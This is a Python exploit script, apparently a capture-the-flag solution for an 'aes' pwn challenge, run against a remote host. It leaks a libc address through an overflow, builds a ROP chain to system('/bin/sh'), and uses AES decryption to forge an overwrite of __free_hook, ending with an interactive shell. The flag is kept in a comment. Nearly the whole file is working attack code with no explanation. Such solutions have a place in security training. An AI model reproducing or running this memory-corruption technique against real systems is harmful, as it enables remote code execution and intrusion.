#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
from Crypto.Cipher import AES

bin_file = './aes'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'65.108.188.88', 'port':51010})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.31.so')
env.set_item('offset_libc_pop23', debug = 0x000e1735, local = 0x000e1735, remote = 0x000e18c5)  # add rsp, 0x00000000000000A8 ; pop rbp ; pop r12 ; ret  ;  (1 found)
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_io_wfile_jumps = libc.symbols['_IO_wfile_jumps']

#==========

def attack(conn, **kwargs):
    ab = AESBox(conn, 'U'*0x10, 'P'*0x10)

    ab.edit_password('P'*0x30+'\xa0')
    addr_libc_io_wfile_jumps = u64(ab.view()[:8])
    libc.address = addr_libc_io_wfile_jumps - offset_libc_io_wfile_jumps
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_pop23     = libc.address + env.offset_libc_pop23
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    rop = ROP(libc)
    rop.system(addr_libc_str_sh)
    exploit = bytes(rop).ljust(0x30, b'\x00')

    key = exploit[0x10:0x10+0x10]
    iv  = exploit[0x20:0x20+0x10]

    aes = AES.new(key, AES.MODE_CBC, iv)
    plain = aes.decrypt(p64(addr_libc_pop23).ljust(0x10, b'\x00'))

    ab.edit_password(exploit + p64(addr_libc_free_hook)[:-2])
    ab.edit_username(plain)
    ab.encrypt()

class AESBox:
    def __init__(self, conn, name, paswd):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

        self.sendafter('Username: ', name)
        self.sendafter('Password: ', paswd)

    def edit_password(self, paswd):
        self.sendlineafter('>> ', '0')
        self.sendafter(': ', paswd)

    def edit_username(self, name):
        self.sendlineafter('>> ', '1')
        self.sendafter(': ', name)

    def encrypt(self):
        self.sendlineafter('>> ', '2')

    def view(self):
        self.sendlineafter('>> ', '3')
        self.recvuntil('= ')
        return self.recv(0x20)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # ASIS{9EA0D8B11C0CAE07961616DF37D675D8}

if __name__=='__main__':
    main()

#==========
